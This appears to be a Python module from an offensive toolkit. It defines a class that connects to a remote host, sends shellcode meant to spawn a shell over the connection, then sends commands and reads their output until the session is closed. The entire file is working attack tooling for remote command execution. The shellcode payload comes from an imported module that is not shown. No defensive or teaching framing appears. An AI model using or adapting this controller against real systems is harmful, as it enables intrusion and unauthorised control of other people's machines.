import logging
import socket
import select
import threading

from Architectures import X64
import Logclass as LC

class ManageSysgraft(LC.Logclass):
    def __init__(self, addr, port, architecture=X64):
        """
        Connect to a remote host and upload shellcode to start a Graft

        :param string addr: The remote host's address or hostname
        :param int port: The port to connect to
        :param Architecture architecture:
            An object with a shell attribute
            More specifically, a shell attribute containing shellcode for
            the target
        """
        super(ManageSysgraft, self).__init__()

        self.architecture = architecture
        self.addr = addr
        self.port = port
        self.command_send_lock = threading.Lock()

        # Connect to the remote host
        self.info("connecting")
        self.conn = socket.create_connection((addr, port))

        # Send it the shellcode necessary to run a shell over the connection
        self.info("sending shellcode")
        self.conn.send(self.architecture.shell)
        self.info("shellcode sent")

    def __str__(self):
        """
        Returns a representation of the object as a string
        Used, for instance, by the logger
        """
        return "Graft {} {} {}".format(self.addr, self.port,
                self.architecture.__name__)

    @LC.log_function_call_and_completion
    def send_command(self, command, recv_timeout=4, add_newline=True):
        """
        Send a command to the Graft, return the output received.
        Only one command may run at a time.  This will block until it can run.

        :param string command: The command to send
        :param int recv_timeout:
            The amount of time to wait after last output before considering
            output finished
        :param bool add_newline:
            If true, add a newline if command doesn't end in one

        :returns string: The command output
        """
        if add_newline and (len(command) < 1 or command[-1] != "\n"):
            command += "\n"

        with self.command_send_lock:
            self.conn.sendall(command)

            total_recvd = ""
            recvd = " "
            rdy = [" "]
            # Keep the loop going until either one is empty
            while rdy and recvd:
                # rdy will be empty if this times out
                rdy, _, _ = select.select([self.conn], [], [], recv_timeout)
                if self.conn in rdy:
                    # recvd will be empty or None if the connection closes
                    recvd = self.conn.recv(4096)
                    if recvd:
                        total_recvd += recvd

        return total_recvd

    @LC.log_function_call
    def close_graft(self, wait_for_command_completion=True):
        """
        Close the Graft nicely
        :param bool wait_for_command_completion:
            Ensure that any running command completes before closing
        """
        def __finish():
            self.conn.send("exit\n")
            self.conn.close()

        if wait_for_command_completion:
            with self.command_send_lock:
                __finish()
        else:
            __finish()

